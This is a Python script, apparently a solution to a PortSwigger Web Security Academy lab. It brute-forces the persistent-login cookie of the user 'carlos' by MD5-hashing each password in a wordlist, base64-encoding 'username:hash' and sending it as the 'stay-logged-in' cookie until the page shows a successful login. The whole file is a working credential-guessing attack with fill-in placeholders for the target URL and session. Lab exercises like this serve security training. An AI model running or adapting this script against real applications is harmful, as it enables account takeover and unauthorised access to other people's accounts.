import hashlib
import base64
import requests

just_main_url='https://0a9d00130477a8d481115c9b00c80007.web-security-academy.net/'  # add your main url without any paths

url = just_main_url+"my-account?id=carlos"

username = "carlos"

passwords_file = "/PortSwigger/passwords.txt"                        # add your password's list 

your_session='JQEVvMVK713EK6iRQ'                                    # add your session


with open(passwords_file, "r") as f:
    for password in f:
        password = password.strip()

        hashed = hashlib.md5(password.encode()).hexdigest()

       
        raw_cookie = f"{username}:{hashed}"
        encoded_cookie = base64.b64encode(raw_cookie.encode()).decode()

        cookies = {
            "session": your_session,  
            "stay-logged-in": encoded_cookie
        }

        print(f"[*] Trying password: {password} \t-> \t{encoded_cookie}")

         
        r = requests.get(url , cookies=cookies)

          
        if "carlos" in r.text or "Log out" in r.text:
            print(f"\n[+] SUCCESS! Password found: {password}")
            print(f"[+] Cookie: {encoded_cookie}")
            break
